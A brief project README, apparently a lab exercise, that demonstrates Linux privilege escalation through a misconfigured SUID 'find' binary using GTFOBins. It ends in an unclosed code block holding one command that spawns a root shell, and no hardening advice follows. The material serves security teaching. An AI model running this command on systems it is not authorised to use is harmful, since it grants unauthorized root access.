# Privilege_Escalation_Simulation

## Overview
This project demonstrates hands-on privilege escalation techniques on a Linux environment (Kali Linux) by identifying and exploiting misconfigured SUID binaries to elevate privileges from a low-privileged user to `root`.

## Project Objectives
* Identify dangerous SUID permissions using Linux command-line enumeration.
* Leverage GTFOBins references to bypass security controls and spawn elevated shells.
* Document security flaws and recommend hardening strategies to mitigate unauthorized privilege escalation.

## Tools & Concepts
* **OS Environment:** Kali Linux / Target Linux VM
* **Techniques:** SUID/SGID Exploitation, GTFOBins, Linux Enumeration (`find`, `sudo -l`)
* **Tools:** Bash, GTFOBins

  
## Exploitation & Proof of Concept

After identifying that the `find` binary had the SUID bit set during enumeration, the following command was executed to spawn an interactive shell with root privileges:

```bash
sudo find . -exec /bin/sh -p \; -quit
